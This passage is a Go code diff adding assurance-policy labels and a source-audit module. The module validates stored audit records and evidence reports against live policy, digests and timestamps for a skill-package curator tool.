@@ -1,0 +1,4513 @@
+diff --git a/internal/artifactpolicy/labels.go b/internal/artifactpolicy/labels.go
+new file mode 100644
+index 0000000..077d651
+--- /dev/null
++++ b/internal/artifactpolicy/labels.go
+@@ -0,0 +1,18 @@
++package artifactpolicy
++
++import "strconv"
++
++// EffectiveLabels reports the closed assurance-policy labels a source-audit
++// evidence report binds: the policy identity, its major version, the
++// detector set, and the limit vector the verdict was admitted under. The
++// labels are constant for the compiled policy; any policy change ships new
++// constants and ages stored source-audit bindings out through the policy
++// digest instead of silently re-authorizing old verdicts.
++func EffectiveLabels() []string {
++	return []string{
++		"policy:" + PolicyID,
++		"policy-version:" + strconv.Itoa(PolicyVersion),
++		"detectors:" + DetectorRegistryID,
++		"limits:" + LimitVectorID,
++	}
++}
+diff --git a/internal/artifactpolicy/labels_test.go b/internal/artifactpolicy/labels_test.go
+new file mode 100644
+index 0000000..b34f89b
+--- /dev/null
++++ b/internal/artifactpolicy/labels_test.go
+@@ -0,0 +1,26 @@
++package artifactpolicy
++
++import (
++	"strings"
++	"testing"
++)
++
++func TestEffectiveLabels(t *testing.T) {
++	labels := EffectiveLabels()
++	if len(labels) == 0 {
++		t.Fatalf("no effective labels")
++	}
++	joined := strings.Join(labels, "\n")
++	for _, want := range []string{PolicyID, DetectorRegistryID, LimitVectorID} {
++		if !strings.Contains(joined, want) {
++			t.Fatalf("labels %q miss %q", labels, want)
++		}
++	}
++	seen := map[string]bool{}
++	for _, label := range labels {
++		if label == "" || seen[label] {
++			t.Fatalf("labels must be non-empty and unique: %q", labels)
++		}
++		seen[label] = true
++	}
++}
+diff --git a/internal/audit/sourceaudit.go b/internal/audit/sourceaudit.go
+new file mode 100644
+index 0000000..7e83723
+--- /dev/null
++++ b/internal/audit/sourceaudit.go
+@@ -0,0 +1,1149 @@
++// Package audit binds Skillfile draft sources to the existing assurance
++// gates through the source-audit-v1 record (skillfile-sources §4).
++//
++// The machine-local source audit binds one frozen package identity, its
++// context hash, the digest of the trusted machine policy it was audited
++// under, the digest of the complete persisted evidence report, the audit
++// timestamp, and the resulting decision. It supplements the registry
++// attestation recorded in the install marker; it never replaces it and it
++// is never itself a registry attestation:
++//
++//   - local inputs have no network registry identity, so no audit-record-v1
++//     is forged for local content and no source-audit object authorizes a
++//     network attestation;
++//   - a missing, unreadable, malformed, stale, or mismatching report fails
++//     instead of becoming an unattested success;
++//   - the stored object is a tamper-evident record, not authority: every
++//     binding is recomputed under the current trusted machine policy and
++//     the live audit decision is enforced before any cache or compiler work.
++package audit
++
++import (
++	"bytes"
++	"crypto/sha256"
++	"encoding/hex"
++	"encoding/json"
++	"errors"
++	"fmt"
++	"io"
++	"os"
++	"path/filepath"
++	"regexp"
++	"strings"
++	"time"
++
++	"github.com/relux-works/curator/internal/capabilities"
++	"github.com/relux-works/curator/internal/config"
++	"github.com/relux-works/curator/internal/protocoljson"
++)
++
++// SourceAuditSchemaVersion is the only source-audit wire version accepted.
++const SourceAuditSchemaVersion = 1
++
++// Source-audit package identity arms (source-types-v1). The arms are
++// disjoint exactly like the lock identities they bind.
++const (
++	SourcePackageLocalSnapshot = "local-snapshot"
++	SourcePackageNetworkGit    = "network-git"
++	SourcePackageConfiguredGit = "configured-git"
++)
++
++// DefaultSourceAuditMaxAge bounds how long a stored binding stays fresh.
++// An older binding is stale, never current: the mutating path re-runs the
++// gates and re-issues, the read-only path refuses. The week matches the
++// default registry snapshot rotation so both evidence families age out
++// together.
++const DefaultSourceAuditMaxAge = 7 * 24 * time.Hour
++
++// sourceAuditClockSkew tolerates clock disagreement between the writer and
++// the reader of a binding. Timestamps beyond now+skew are rejected as
++// forged rather than fresh.
++const sourceAuditClockSkew = 5 * time.Minute
++
++var (
++	sourceAuditSHA256RE = regexp.MustCompile(`^sha256:[0-9a-f]{64}$`)
++	sourceAuditHex40RE  = regexp.MustCompile(`^[0-9a-f]{40}$`)
++	sourceAuditHex64RE  = regexp.MustCompile(`^[0-9a-f]{64}$`)
++)
++
++// SourceCommit is a locked Git object bound by a source-audit package.
++type SourceCommit struct {
++	ObjectFormat string `json:"object_format"`
++	Hex          string `json:"hex"`
++}
++
++// SourcePackage is the frozen package identity a source-audit object binds.
++// Exactly one arm is populated; the commit pointer stays nil on the local
++// arm so the marshalled shape matches the source-types-v1 arms exactly.
++type SourcePackage struct {
++	Kind       string        `json:"kind"`
++	Snapshot   string        `json:"snapshot,omitempty"`
++	Repository string        `json:"repository,omitempty"`
++	Source     string        `json:"source,omitempty"`
++	Commit     *SourceCommit `json:"commit,omitempty"`
++	Directory  string        `json:"directory,omitempty"`
++}
++
++// sourcePackageArm is the closed wire shape of one package union arm,
++// derived from source-types-v1.schema.json #/$defs/package (oneOf[0..2],
++// each additionalProperties:false). allowed and required are identical for
++// the three arms: any present foreign member — even null or empty — refuses,
++// and every required member must be present, non-null, and of the declared
++// JSON kind. Value patterns (digests, repository syntax, directory ".")
++// stay in validate(); this table binds presence, closedness, and kind.
++type sourcePackageArm struct {
++	allowed  map[string]string
++	required map[string]string
++}
++
++// sourcePackageArms is the schema-driven closed-shape table. A test reads
++// the vendored accepted schemas and asserts this table matches their
++// arms/required/additionalProperties, so schema drift fails the build
++// instead of silently reopening a shape hole.
++var sourcePackageArms = map[string]sourcePackageArm{
++	SourcePackageLocalSnapshot: {
++		allowed:  map[string]string{"kind": "string", "snapshot": "string"},
++		required: map[string]string{"kind": "string", "snapshot": "string"},
++	},
++	SourcePackageNetworkGit: {
++		allowed: map[string]string{
++			"kind": "string", "repository": "string", "commit": "object", "directory": "string",
++		},
++		required: map[string]string{
++			"kind": "string", "repository": "string", "commit": "object", "directory": "string",
++		},
++	},
++	SourcePackageConfiguredGit: {
++		allowed: map[string]string{
++			"kind": "string", "source": "string", "commit": "object", "directory": "string",
++		},
++		required: map[string]string{
++			"kind": "string", "source": "string", "commit": "object", "directory": "string",
++		},
++	},
++}
++
++// sourceAuditObjectMembers is the closed top-level shape of
++// source-audit-v1.schema.json (required 7, additionalProperties:false).
++var sourceAuditObjectMembers = map[string]string{
++	"schema_version": "number", "package": "object", "content_sha256": "string",
++	"policy_sha256": "string", "evidence_sha256": "string",
++	"decision": "string", "created_at": "string",
++}
++
++// evidenceReportMembers is the closed top-level shape of the persisted
++// evidence report. MarshalEvidenceReport always emits all 11 members, so
++// all are required, non-null, and kind-checked; unknown members refuse.
++var evidenceReportMembers = map[string]string{
++	"schema_version": "number", "skill": "string", "package": "object",
++	"content_sha256": "string", "findings": "array", "pinned": "boolean",
++	"revoked": "boolean", "revocation": "string",
++	"script_policy": "array", "assurance_policy": "array", "decision": "string",
++}
++
++// rawJSONKind classifies one JSON value by its wire kind without decoding
++// into Go zero values (which erase null/empty distinctions).
++func rawJSONKind(raw json.RawMessage) string {
++	trimmed := bytes.TrimSpace(raw)
++	if len(trimmed) == 0 {
++		return "unknown"
++	}
++	if string(trimmed) == "null" {
++		return "null"
++	}
++	switch trimmed[0] {
++	case '"':
++		return "string"
++	case '{':
++		return "object"
++	case '[':
++		return "array"
++	case 't', 'f':
++		return "boolean"
++	case '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9':
++		return "number"
++	default:
++		return "unknown"
++	}
++}
++
++// validateSourceCommitRaw enforces the closed lockedCommit shape
++// (object_format + hex, both non-null strings, no extras) on raw bytes.
++func validateSourceCommitRaw(commitRaw json.RawMessage) error {
++	var raw map[string]json.RawMessage
++	if err := json.Unmarshal(commitRaw, &raw); err != nil {
++		return fmt.Errorf("commit is malformed: %v", err)
++	}
++	for key := range raw {
++		if key != "object_format" && key != "hex" {
++			return fmt.Errorf("commit carries no %q member", key)
++		}
++	}
++	for _, key := range []string{"object_format", "hex"} {
++		encoded, ok := raw[key]
++		if !ok {
++			return fmt.Errorf("commit is incomplete: missing %q", key)
++		}
++		if rawJSONKind(encoded) == "null" {
++			return fmt.Errorf("commit member %q is null", key)
++		}
++		if rawJSONKind(encoded) != "string" {
++			return fmt.Errorf("commit member %q must be a string", key)
++		}
++	}
++	return nil
++}
++
++// validateSourcePackageRaw enforces the package union by selected kind on
++// raw bytes BEFORE decoding into Go types. Presence alone refuses: a
++// foreign-arm member fails even when null or empty, because zero-value
++// decoding would otherwise erase it.
++func validateSourcePackageRaw(packageRaw json.RawMessage) error {
++	if rawJSONKind(packageRaw) == "null" {
++		return fmt.Errorf("package is null")
++	}
++	if rawJSONKind(packageRaw) != "object" {
++		return fmt.Errorf("package must be an object")
++	}
++	var raw map[string]json.RawMessage
++	if err := json.Unmarshal(packageRaw, &raw); err != nil {
++		return fmt.Errorf("package is malformed: %v", err)
++	}
++	kindRaw, ok := raw["kind"]
++	if !ok {
++		return fmt.Errorf("package is incomplete: missing %q", "kind")
++	}
++	if rawJSONKind(kindRaw) == "null" {
++		return fmt.Errorf("package member %q is null", "kind")
++	}
++	if rawJSONKind(kindRaw) != "string" {
++		return fmt.Errorf("package member %q must be a string", "kind")
++	}
++	var kind string
++	if err := json.Unmarshal(kindRaw, &kind); err != nil {
++		return fmt.Errorf("package member %q is malformed: %v", "kind", err)
++	}
++	arm, ok := sourcePackageArms[kind]
++	if !ok {
++		return fmt.Errorf("unknown package kind %q", kind)
++	}
++	for key := range raw {
++		if _, allowed := arm.allowed[key]; !allowed {
++			return fmt.Errorf("package kind %q carries no %q member", kind, key)
++		}
++	}
++	for key, want := range arm.required {
++		encoded, ok := raw[key]
++		if !ok {
++			return fmt.Errorf("package kind %q is incomplete: missing %q", kind, key)
++		}
++		if rawJSONKind(encoded) == "null" {
++			return fmt.Errorf("package member %q is null", key)
++		}
++		if got := rawJSONKind(encoded); got != want {
++			return fmt.Errorf("package member %q must be %s", key, want)
++		}
++	}
++	if commitRaw, ok := raw["commit"]; ok {
++		if err := validateSourceCommitRaw(commitRaw); err != nil {
++			return err
++		}
++	}
++	return nil
++}
++
++// validateSourceAuditObjectRaw enforces the closed source-audit-v1 top-level
++// shape on raw bytes: exactly the 7 required members, each non-null and of
++// the declared kind, no unknown members.
++func validateSourceAuditObjectRaw(raw map[string]json.RawMessage) error {
++	for key := range raw {
++		if _, ok := sourceAuditObjectMembers[key]; !ok {
++			return fmt.Errorf("unknown member %q", key)
++		}
++	}
++	for key, want := range sourceAuditObjectMembers {
++		encoded, ok := raw[key]
++		if !ok {
++			return fmt.Errorf("missing %q", key)
++		}
++		if rawJSONKind(encoded) == "null" {
++			return fmt.Errorf("member %q is null", key)
++		}
++		if got := rawJSONKind(encoded); got != want {
++			return fmt.Errorf("member %q must be %s", key, want)
++		}
++	}
++	return nil
++}
++
++// validateEvidenceReportRaw enforces the closed evidence-report shape on raw
++// bytes: exactly the 11 required members, each non-null and of the declared
++// kind, no unknown members, plus the closed package union by kind.
++func validateEvidenceReportRaw(evidence []byte) (map[string]json.RawMessage, error) {
++	decoder := json.NewDecoder(bytes.NewReader(evidence))
++	var raw map[string]json.RawMessage
++	if err := decoder.Decode(&raw); err != nil {
++		return nil, fmt.Errorf("report is malformed: %v", err)
++	}
++	var extra json.RawMessage
++	if err := decoder.Decode(&extra); err != io.EOF {
++		if err == nil {
++			return nil, fmt.Errorf("report is malformed: trailing data after JSON document")
++		}
++		return nil, fmt.Errorf("report is malformed: trailing data: %v", err)
++	}
++	for key := range raw {
++		if _, ok := evidenceReportMembers[key]; !ok {
++			return nil, fmt.Errorf("report carries no %q member", key)
++		}
++	}
++	for key, want := range evidenceReportMembers {
++		encoded, ok := raw[key]
++		if !ok {
++			return nil, fmt.Errorf("report is incomplete: missing %q", key)
++		}
++		if rawJSONKind(encoded) == "null" {
++			return nil, fmt.Errorf("report member %q is null", key)
++		}
++		if got := rawJSONKind(encoded); got != want {
++			return nil, fmt.Errorf("report member %q must be %s", key, want)
++		}
++	}
++	if err := validateSourcePackageRaw(raw["package"]); err != nil {
++		return nil, err
++	}
++	return raw, nil
++}
++
++// validate enforces the disjoint source-types-v1 arms.
++func (pkg SourcePackage) validate() error {
++	switch pkg.Kind {
++	case SourcePackageLocalSnapshot:
++		if pkg.Snapshot == "" || !sourceAuditSHA256RE.MatchString(pkg.Snapshot) {
++			return fmt.Errorf("local-snapshot package requires a sha256 snapshot digest")
++		}
++		if pkg.Repository != "" || pkg.Source != "" || pkg.Commit != nil || pkg.Directory != "" {
++			return fmt.Errorf("local-snapshot package carries no Git fields")
++		}
++	case SourcePackageNetworkGit:
++		if pkg.Repository == "" {
++			return fmt.Errorf("network-git package requires a repository")
++		}
++		if pkg.Commit == nil {
++			return fmt.Errorf("network-git package requires a commit")
++		}
++		if err := pkg.Commit.validate(); err != nil {
++			return err
++		}
++		if pkg.Directory == "" {
++			return fmt.Errorf("network-git package requires a directory")
++		}
++		if pkg.Snapshot != "" || pkg.Source != "" {
++			return fmt.Errorf("network-git package carries no snapshot or configured source")
++		}
++	case SourcePackageConfiguredGit:
++		if pkg.Source == "" {
++			return fmt.Errorf("configured-git package requires a source")
++		}
++		if pkg.Commit == nil {
++			return fmt.Errorf("configured-git package requires a commit")
++		}
++		if err := pkg.Commit.validate(); err != nil {
++			return err
++		}
++		if pkg.Directory != "." {
++			return fmt.Errorf("configured-git package directory must be \".\"")
++		}
++		if pkg.Snapshot != "" || pkg.Repository != "" {
++			return fmt.Errorf("configured-git package carries no snapshot or repository")
++		}
++	default:
++		return fmt.Errorf("unknown package kind %q", pkg.Kind)
++	}
++	return nil
++}
++
++// object projects the package into the CCJ-1 value domain. Only populated
++// arm members appear, so the local shape carries no Git members.
++func (pkg SourcePackage) object() map[string]any {
++	document := map[string]any{"kind": pkg.Kind}
++	if pkg.Snapshot != "" {
++		document["snapshot"] = pkg.Snapshot
++	}
++	if pkg.Repository != "" {
++		document["repository"] = pkg.Repository
++	}
++	if pkg.Source != "" {
++		document["source"] = pkg.Source
++	}
++	if pkg.Commit != nil {
++		document["commit"] = map[string]any{
++			"hex":           pkg.Commit.Hex,
++			"object_format": pkg.Commit.ObjectFormat,
++		}
++	}
++	if pkg.Directory != "" {
++		document["directory"] = pkg.Directory
++	}
++	return document
++}
++
++func (commit SourceCommit) validate() error {
++	switch commit.ObjectFormat {
++	case "sha1":
++		if !sourceAuditHex40RE.MatchString(commit.Hex) {
++			return fmt.Errorf("sha1 commit must be 40 lowercase hex")
++		}
++	case "sha256":
++		if !sourceAuditHex64RE.MatchString(commit.Hex) {
++			return fmt.Errorf("sha256 commit must be 64 lowercase hex")
++		}
++	default:
++		return fmt.Errorf("commit object_format must be sha1 or sha256")
++	}
++	return nil
++}
++
++// SourceAudit is the source-audit-v1 wire object: the six bindings of
++// skillfile-sources §4 (identity, context, policy, evidence, time,
++// decision). It is a machine-local record, never a registry attestation.
++type SourceAudit struct {
++	SchemaVersion  int           `json:"schema_version"`
++	Package        SourcePackage `json:"package"`
++	ContentSHA256  string        `json:"content_sha256"`
++	PolicySHA256   string        `json:"policy_sha256"`
++	EvidenceSHA256 string        `json:"evidence_sha256"`
++	Decision       string        `json:"decision"`
++	CreatedAt      string        `json:"created_at"`
++}
++
++// createdTime parses the RFC3339 UTC timestamp. Spec timestamps end in Z.
++func (object SourceAudit) createdTime() (time.Time, error) {
++	if !strings.HasSuffix(object.CreatedAt, "Z") {
++		return time.Time{}, fmt.Errorf("created_at must be an RFC3339 UTC timestamp")
++	}
++	parsed, err := time.Parse(time.RFC3339, object.CreatedAt)
++	if err != nil {
++		return time.Time{}, fmt.Errorf("created_at is malformed: %v", err)
++	}
++	return parsed, nil
++}
++
++// ParseSourceAudit decodes one wire object with closed-shape checks:
++// unknown fields, missing bindings, wrong versions, non-enum decisions,
++// malformed digests, non-UTC timestamps, and trailing data all fail. Exactly
++// one complete JSON document is accepted: any trailing token after the first
++// value refuses as malformed.
++//
++// The wire shape is validated on RAW bytes before decoding into Go types:
++// the top-level object must carry exactly the 7 required members
++// (non-null, declared kind, no extras) and the package union is validated
++// by its selected kind arm with additionalProperties:false. Go zero values
++// erase null/empty distinctions, so a foreign-arm member that is null or
++// empty would otherwise disappear through decoding and projection.
++func ParseSourceAudit(payload []byte) (SourceAudit, error) {
++	decoder := json.NewDecoder(bytes.NewReader(payload))
++	var raw map[string]json.RawMessage
++	if err := decoder.Decode(&raw); err != nil {
++		return SourceAudit{}, fmt.Errorf("source_audit_rejected: malformed: %v", err)
++	}
++	var extra json.RawMessage
++	if err := decoder.Decode(&extra); err != io.EOF {
++		if err == nil {
++			return SourceAudit{}, fmt.Errorf("source_audit_rejected: malformed: trailing data after JSON document")
++		}
++		return SourceAudit{}, fmt.Errorf("source_audit_rejected: malformed: trailing data: %v", err)
++	}
++	if err := validateSourceAuditObjectRaw(raw); err != nil {
++		return SourceAudit{}, fmt.Errorf("source_audit_rejected: malformed: %v", err)
++	}
++	if err := validateSourcePackageRaw(raw["package"]); err != nil {
++		return SourceAudit{}, fmt.Errorf("source_audit_rejected: malformed: %v", err)
++	}
++	var object SourceAudit
++	structDecoder := json.NewDecoder(bytes.NewReader(payload))
++	structDecoder.DisallowUnknownFields()
++	if err := structDecoder.Decode(&object); err != nil {
++		return SourceAudit{}, fmt.Errorf("source_audit_rejected: malformed: %v", err)
++	}
++	if err := validateSourceAuditShape(object); err != nil {
++		return SourceAudit{}, fmt.Errorf("source_audit_rejected: malformed: %w", err)
++	}
++	return object, nil
++}
++
++func validateSourceAuditShape(object SourceAudit) error {
++	if object.SchemaVersion != SourceAuditSchemaVersion {
++		return fmt.Errorf("schema_version must be %d", SourceAuditSchemaVersion)
++	}
++	if err := object.Package.validate(); err != nil {
++		return fmt.Errorf("package: %w", err)
++	}
++	if !sourceAuditSHA256RE.MatchString(object.ContentSHA256) {
++		return fmt.Errorf("content_sha256 is malformed")
++	}
++	if !sourceAuditSHA256RE.MatchString(object.PolicySHA256) {
++		return fmt.Errorf("policy_sha256 is malformed")
++	}
++	if !sourceAuditSHA256RE.MatchString(object.EvidenceSHA256) {
++		return fmt.Errorf("evidence_sha256 is malformed")
++	}
++	switch object.Decision {
++	case DecisionAllow, DecisionWarn, DecisionBlock, DecisionRequirePin:
++	default:
++		return fmt.Errorf("decision %q is not recognized", object.Decision)
++	}
++	if _, err := object.createdTime(); err != nil {
++		return err
++	}
++	return nil
++}
++
++// PolicyInputs are the trusted machine-policy inputs a source-audit policy
++// binding covers. Audit mode/threshold, detector generations, revocations,
++// and the effective script/assurance policy labels all enter the digest, so
++// any policy change ages stored bindings out instead of silently
++// re-authorizing old verdicts under new rules.
++type PolicyInputs struct {
++	AuditMode       string
++	AuditFailOn     string
++	Revocations     []string
++	ScriptLabels    []string
++	AssuranceLabels []string
++}
++
++// PolicyDigest binds the effective machine policy: SHA-256 over the CCJ-1
++// of the policy inputs, in the schema digest shape.
++func PolicyDigest(inputs PolicyInputs) (string, error) {
++	revocations := append([]string(nil), inputs.Revocations...)
++	document := map[string]any{
++		"assurance": append([]string(nil), inputs.AssuranceLabels...),
++		"audit": map[string]any{
++			"fail_on":         inputs.AuditFailOn,
++			"mode":            inputs.AuditMode,
++			"prompt_version":  PromptVersion,
++			"revocations":     revocations,
++			"ruleset_version": RulesetVersion,
++		},
++		"script": append([]string(nil), inputs.ScriptLabels...),
++	}
++	if document["assurance"] == nil {
++		document["assurance"] = []string{}
++	}
++	if document["script"] == nil {
++		document["script"] = []string{}
++	}
++	canonical, err := protocoljson.MarshalCanonical(document)
++	if err != nil {
++		return "", err
++	}
++	sum := sha256.Sum256(canonical)
++	return "sha256:" + hex.EncodeToString(sum[:]), nil
++}
++
++// EvidenceReport is the persisted complete audit report a source-audit
++// object binds: findings, pins, revocations, and the effective
++// script/assurance policy labels behind the verdict.
++type EvidenceReport struct {
++	SchemaVersion   int           `json:"schema_version"`
++	Skill           string        `json:"skill"`
++	Package         SourcePackage `json:"package"`
++	ContentSHA256   string        `json:"content_sha256"`
++	Findings        []Finding     `json:"findings"`
++	Pinned          bool          `json:"pinned"`
++	Revoked         bool          `json:"revoked"`
++	Revocation      string        `json:"revocation,omitempty"`
++	ScriptPolicy    []string      `json:"script_policy"`
++	AssurancePolicy []string      `json:"assurance_policy"`
++	Decision        string        `json:"decision"`
++}
++
++// MarshalEvidenceReport renders the canonical report bytes the evidence
++// digest covers.
++func MarshalEvidenceReport(report EvidenceReport) ([]byte, error) {
++	findings := make([]any, 0, len(report.Findings))
++	for _, finding := range report.Findings {
++		findings = append(findings, map[string]any{
++			"evidence":   finding.Evidence,
++			"file":       finding.File,
++			"id":         finding.ID,
++			"severity":   finding.Severity,
++			"verifiable": finding.Verifiable,
++		})
++	}
++	return protocoljson.MarshalCanonical(map[string]any{
++		"assurance_policy": append([]string(nil), report.AssurancePolicy...),
++		"content_sha256":   report.ContentSHA256,
++		"decision":         report.Decision,
++		"findings":         findings,
++		"package":          report.Package.object(),
++		"pinned":           report.Pinned,
++		"revocation":       report.Revocation,
++		"revoked":          report.Revoked,
++		"schema_version":   report.SchemaVersion,
++		"script_policy":    append([]string(nil), report.ScriptPolicy...),
++		"skill":            report.Skill,
++	})
++}
++
++// EvidenceDigest is the SHA-256 of canonical report bytes, in schema shape.
++func EvidenceDigest(canonical []byte) string {
++	sum := sha256.Sum256(canonical)
++	return "sha256:" + hex.EncodeToString(sum[:])
++}
++
++// SourceExpectation is the recomputed ground truth one stored object is
++// checked against. Every field comes from live machine state — the lock,
++// the trusted policy, the persisted report bytes, and a fresh audit run —
++// never from the object under test. The Skill/Findings/Pinned/Revoked/
++// Revocation/ScriptLabels/AssuranceLabels arms bind the persisted evidence
++// report to the authoritative live verdict and policy labels; the stored
++// bytes' own hash never authorizes them.
++type SourceExpectation struct {
++	Package         SourcePackage
++	Content         string
++	Policy          string
++	Evidence        []byte
++	Decision        string
++	Now             time.Time
++	MaxAge          time.Duration
++	Skill           string
++	Findings        []Finding
++	Pinned          bool
++	Revoked         bool
++	Revocation      string
++	ScriptLabels    []string
++	AssuranceLabels []string
++}
++
++// sourceAuditError is the typed validation outcome for ValidateSourceAudit.
++// Renewable and Cause are set only by the validator's own decision — never
++// derived from diagnostic text — so untrusted report fields interpolated
++// into the message cannot select renewal. Diagnostics may still quote
++// report fields; classification reads only these fields via errors.As.
++type sourceAuditError struct {
++	msg       string
++	Renewable bool
++	Cause     string
++}
++
++func (e *sourceAuditError) Error() string { return e.msg }
++
++// Renewal causes set by the validator. Only these two may renew.
++const (
++	auditCausePolicy = "policy"
++	auditCauseStale  = "stale"
++)
++
++// rejectAuditf builds a non-renewable refusal. Every phase-1 binding uses
++// it, so even a message quoting attacker-controlled report fields stays
++// non-renewable.
++func rejectAuditf(format string, args ...any) *sourceAuditError {
++	return &sourceAuditError{msg: fmt.Sprintf(format, args...)}
++}
++
++// renewAuditf builds the only renewable outcomes: a trusted policy-label
++// drift or an aged timestamp, decided by the validator after phase 1.
++func renewAuditf(cause string, format string, args ...any) *sourceAuditError {
++	return &sourceAuditError{msg: fmt.Sprintf(format, args...), Renewable: true, Cause: cause}
++}
++
++// ValidateSourceAudit checks the six §4 bindings in two strict phases. A
++// stored object never overrides live state; the first mismatch fails.
++//
++// Phase 1 — NON-RENEWABLE bindings, evaluated completely first: identity,
++// context, evidence integrity/completeness/trusted bindings, the stored
++// decision against the live decision, and the forged-future time bound.
++// Any failure here refuses on both paths and never overwrites.
++//
++// Phase 2 — RENEWABLE conditions, evaluated only after phase 1 passes: an
++// aged timestamp or a trusted policy-label drift. Only these two may lead
++// to re-issuance on the mutating path.
++//
++// The split is structural, not per-branch: adding a new renewable cause
++// must extend phase 2, and no non-renewable check may move below it, so a
++// renewable error can never hide another refusal. Evidence covers both the
++// digest over the exact stored bytes and the completeness and trusted
++// bindings of the decoded report: a stripped or wrong-skill report with a
++// recomputed digest still fails because its contents do not match the live
++// authoritative verdict and policy labels.
++func ValidateSourceAudit(object SourceAudit, expected SourceExpectation) error {
++	if err := validateSourceAuditShape(object); err != nil {
++		return rejectAuditf("source_audit_rejected: malformed: %v", err)
++	}
++	if !packagesEqual(object.Package, expected.Package) {
++		return rejectAuditf("source_audit_rejected: identity: object binds %+v, locked package is %+v", object.Package, expected.Package)
++	}
++	if !strings.EqualFold(object.ContentSHA256, expected.Content) {
++		return rejectAuditf("source_audit_rejected: context: object binds %s, locked content is %s", object.ContentSHA256, expected.Content)
++	}
++	if EvidenceDigest(expected.Evidence) != strings.ToLower(object.EvidenceSHA256) {
++		return rejectAuditf("source_audit_rejected: evidence: report digest mismatch")
++	}
++	// Closed report shape on RAW bytes before decoding into Go types: the
++	// 11 required members must be present, non-null, and of the declared
++	// kind with no unknown members, and the package union is validated by
++	// its selected kind arm. Zero-value decoding would otherwise erase a
++	// foreign-arm null/empty member or a null scalar.
++	if _, err := validateEvidenceReportRaw(expected.Evidence); err != nil {
++		return rejectAuditf("source_audit_rejected: evidence: %v", err)
++	}
++	var report EvidenceReport
++	decoder := json.NewDecoder(bytes.NewReader(expected.Evidence))
++	decoder.DisallowUnknownFields()
++	if err := decoder.Decode(&report); err != nil {
++		return rejectAuditf("source_audit_rejected: evidence: report is malformed: %v", err)
++	}
++	var reportExtra json.RawMessage
++	if err := decoder.Decode(&reportExtra); err != io.EOF {
++		if err == nil {
++			return rejectAuditf("source_audit_rejected: evidence: report is malformed: trailing data after JSON document")
++		}
++		return rejectAuditf("source_audit_rejected: evidence: report is malformed: trailing data: %v", err)
++	}
++	if report.SchemaVersion != 1 {
++		return rejectAuditf("source_audit_rejected: evidence: report schema_version must be 1")
++	}
++	if report.Skill == "" || report.ContentSHA256 == "" || report.Decision == "" {
++		return rejectAuditf("source_audit_rejected: evidence: report is malformed: missing skill, content, or decision")
++	}
++	if report.Findings == nil {
++		return rejectAuditf("source_audit_rejected: evidence: report is incomplete: missing findings")
++	}
++	if report.ScriptPolicy == nil {
++		return rejectAuditf("source_audit_rejected: evidence: report is incomplete: missing script_policy")
++	}
++	if report.AssurancePolicy == nil {
++		return rejectAuditf("source_audit_rejected: evidence: report is incomplete: missing assurance_policy")
++	}
++	if err := report.Package.validate(); err != nil {
++		return rejectAuditf("source_audit_rejected: evidence: report package is malformed: %v", err)
++	}
++	if !sourceAuditSHA256RE.MatchString(report.ContentSHA256) {
++		return rejectAuditf("source_audit_rejected: evidence: report content_sha256 is malformed")
++	}
++	switch report.Decision {
++	case DecisionAllow, DecisionWarn, DecisionBlock, DecisionRequirePin:
++	default:
++		return rejectAuditf("source_audit_rejected: evidence: report decision %q is not recognized", report.Decision)
++	}
++	for _, finding := range report.Findings {
++		if finding.ID == "" || finding.Severity == "" || finding.Evidence == "" {
++			return rejectAuditf("source_audit_rejected: evidence: report finding is malformed")
++		}
++		if _, known := severityRank[finding.Severity]; !known {
++			return rejectAuditf("source_audit_rejected: evidence: report finding severity %q is not recognized", finding.Severity)
++		}
++	}
++	if !strings.EqualFold(report.ContentSHA256, object.ContentSHA256) || !packagesEqual(report.Package, object.Package) {
++		return rejectAuditf("source_audit_rejected: evidence: report binds another package")
++	}
++	if report.Decision != object.Decision {
++		return rejectAuditf("source_audit_rejected: evidence: report decision %q differs from bound decision %q", report.Decision, object.Decision)
++	}
++	if expected.Skill != "" && report.Skill != expected.Skill {
++		return rejectAuditf("source_audit_rejected: evidence: report skill %q differs from locked skill %q", report.Skill, expected.Skill)
++	}
++	if !findingsEqual(report.Findings, expected.Findings) {
++		return rejectAuditf("source_audit_rejected: evidence: report findings differ from the live audit verdict")
++	}
++	if report.Pinned != expected.Pinned {
++		return rejectAuditf("source_audit_rejected: evidence: report pin state differs from the live operator pins")
++	}
++	if report.Revoked != expected.Revoked || report.Revocation != expected.Revocation {
++		return rejectAuditf("source_audit_rejected: evidence: report revocation differs from the live revocation state")
++	}
++	if !labelsEqual(report.ScriptPolicy, expected.ScriptLabels) {
++		return rejectAuditf("source_audit_rejected: evidence: report script_policy differs from the effective script policy")
++	}
++	if !labelsEqual(report.AssurancePolicy, expected.AssuranceLabels) {
++		return rejectAuditf("source_audit_rejected: evidence: report assurance_policy differs from the effective assurance policy")
++	}
++	// Phase 1 ends here: the stored decision must equal the live decision
++	// before any renewable condition is considered. A forged decision
++	// combined with a stale timestamp or a policy drift still refuses.
++	if object.Decision != expected.Decision {
++		return rejectAuditf("source_audit_rejected: decision: object claims %q, current policy decides %q", object.Decision, expected.Decision)
++	}
++	created, err := object.createdTime()
++	if err != nil {
++		return rejectAuditf("source_audit_rejected: time: %v", err)
++	}
++	maxAge := expected.MaxAge
++	if maxAge <= 0 {
++		maxAge = DefaultSourceAuditMaxAge
++	}
++	// A future timestamp is forged, never renewable: it stays in phase 1.
++	if created.After(expected.Now.Add(sourceAuditClockSkew)) {
++		return rejectAuditf("source_audit_rejected: time: created_at %s is in the future", object.CreatedAt)
++	}
++	// Phase 2 — renewable conditions only. Every non-renewable binding
++	// above passed; nothing below may precede a phase-1 check. These are
++	// the only renewAuditf sites: renewal is decided here, never inferred
++	// from message text.
++	if expected.Now.Sub(created) > maxAge {
++		return renewAuditf(auditCauseStale, "source_audit_rejected: time: binding from %s is stale; re-run the gates", object.CreatedAt)
++	}
++	if !strings.EqualFold(object.PolicySHA256, expected.Policy) {
++		return renewAuditf(auditCausePolicy, "source_audit_rejected: policy: trusted policy changed; re-run the gates")
++	}
++	return nil
++}
++
++// packagesEqual compares package identities by canonical value. The commit
++// arm is a pointer so local shapes marshal exactly; pointer identity must
++// not leak into equality.
++func packagesEqual(left, right SourcePackage) bool {
++	leftBytes, leftErr := protocoljson.MarshalCanonical(left.object())
++	rightBytes, rightErr := protocoljson.MarshalCanonical(right.object())
++	if leftErr != nil || rightErr != nil {
++		return false
++	}
++	return bytes.Equal(leftBytes, rightBytes)
++}
++
++// findingsEqual compares live and stored findings. Nil and empty both mean
++// "no findings" and compare equal; otherwise the verdict inputs must match
++// exactly, in order.
++func findingsEqual(stored, live []Finding) bool {
